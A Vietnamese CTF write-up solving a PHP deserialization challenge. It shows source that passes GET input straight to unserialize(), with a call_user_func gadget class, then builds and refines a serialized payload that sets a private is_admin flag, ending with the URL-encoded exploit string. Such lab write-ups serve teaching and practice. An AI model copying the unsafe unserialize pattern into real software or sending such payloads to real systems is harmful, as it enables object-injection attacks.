# CTF Cây nhà lá vườn :D
##  PHP Serialize CTF 
  Link : http://45.122.249.68:10001/

  Source code của bài:

  ```php
<?php
#include "config.php";
class User{
    private $name;
    private $is_admin = false;
    public function __construct($name){
        $this->$name = $name;
    }
    public function __destruct(){
        if($this->is_admin === true){
            echo "hi admin, here is your flag";
        }
    }
}
class Show_color{
    public $color;
    public $type;
    public function __construct($type,$color){
        $this->type = $type;
        $this->color = $color;
    }
     public function __destruct(){
         call_user_func($this->type->adu,$this->color);
     }
}
class do_nothing{
    public $why;
    public $i_use_this;
    public function __construct($a,$b){
        $this->why = $a;
        $this->i_use_this = $b;
    }
    public function __get($method){
        if(isset($this->why)){
            return $this->i_use_this;
        }
        return $method;
    }
}
if(isset($_GET['code'])){
    unserialize($_GET['code']);
}
else{
    highlight_file(__FILE__);
}
?>
  ```

## Ý tưởng của bài 
  ```php
  class User{
  private $name;
  private $is_admin = false;
  public function __construct($name){
      $this->$name = $name;
  }
  public function __destruct(){
      if($this->is_admin === true){
          echo "hi admin, here is your flag";
      }
  }
}
  ```

  Trong hàm __detruct() của class User sẽ kiểm tra điều kiện is_admin === true thì web sẽ in ra kết quả "hi admin, here is your flag". Vậy chỉ cần gán giá trị cho is_admin = 1 là xong. ez :D
  
  ```php
    if(isset($_GET['code']))
    {
        unserialize($_GET['code']);
    }
    else
    {
        highlight_file(__FILE__);
    }
  ```
  Ở đây web sẽ nhận 1 parameter **code** sau đó sẽ unserialize giá trị truyền vào để tiếp tục thực thi. Do giá trị code này không được kiểm tra trước khi thực thi,nên chỉ cần tạo 1 payload serialize sao cho chuyển giá trị is_admin =1 là giải được bài này. 

## Create Payload
  Sử dụng vscode để debug và lệnh php -S 127.0.0.1 9000 code.php để debug trên localhost
 
  <img src="https://imgur.com/nzePFET"/>
  
  Tạo thêm 1 đoạn code để tạo serialize payload 

  ```php
  <?php 
    class User{
        private $name;
        private $is_admin = false;
        public function __construct($name){
            $this->$name = $name;
            var_dump($name);
        }
        public function __destruct(){
            if($this->is_admin === true){
                echo "hi admin, here is your flag";
            }
        }
    }  

 	// Create a object
    $a = new User("CaLopChacChuaCoAiLamDuocDau");
    
    // Print a after serialize
 	echo serialize($a);
?>
  ```

  Chạy đoạn code trên : **php -f exploit.php** Kết quả sẽ được 1 chuỗi sau khi serialize

  ```
  O:4:"User":3:{s:10:"Username";N;s:14:"Useris_admin";b:0;s:27:"CaLopChacChuaCoAiLamDuocDau";s:27:"CaLopChacChuaCoAiLamDuocDau";}
  ```

  Sửa lại chuỗi **s:14:"Useris_admin";b:1;**

  ```
  O:4:"User":3:{s:10:"Username";N;s:14:"Useris_admin";b:1;s:27:"CaLopChacChuaCoAiLamDuocDau";s:27:"CaLopChacChuaCoAiLamDuocDau";}
  ```

  Do biến $name và $is_admin là 2 biến được đặt ở private nên khi serialize sẽ tạo ra Username và Useris_admin. Do format khi serialize của PHP
  
  Nhưng khi thực thi payload này kết quả sẽ **không** trả về. Do việc deserialize bị lỗi 

  <img src="https://imgur.com/zyQvjMv" />
  
  Vì vậy cần sửa lại payload 1 chút để khi deserialize sẽ cho ra kết quả mong muốn

  ```
  O:4:"User":3:{s:4:"name";N;s:8:"is_admin";b:1;s:27:"CaLopChacChuaCoAiLamDuocDau";s:27:"CaLopChacChuaCoAiLamDuocDau";}
  ```
## Kết quả 
  Thực hiện chèn payload trên vào biến code 

  ?code=O:4:%22User%22:3:{s:4:%22name%22;N;s:8:%22is_admin%22;b:1;s:27:%22CaLopChacChuaCoAiLamDuocDau%22;s:27:%22CaLopChacChuaCoAiLamDuocDau%22;}

  Kết quả ez :D 

  <img src="https://imgur.com/phCU6LU" />

## Tài liệu tham khảo
  PHP Classes and Object : https://www.php.net/manual/en/language.oop5.php

  PHP serialize : https://www.php.net/manual/en/function.serialize.php

  Youtube about POP (Babytalk) : https://www.youtube.com/watch?v=DDxRn3CNdeQ


  


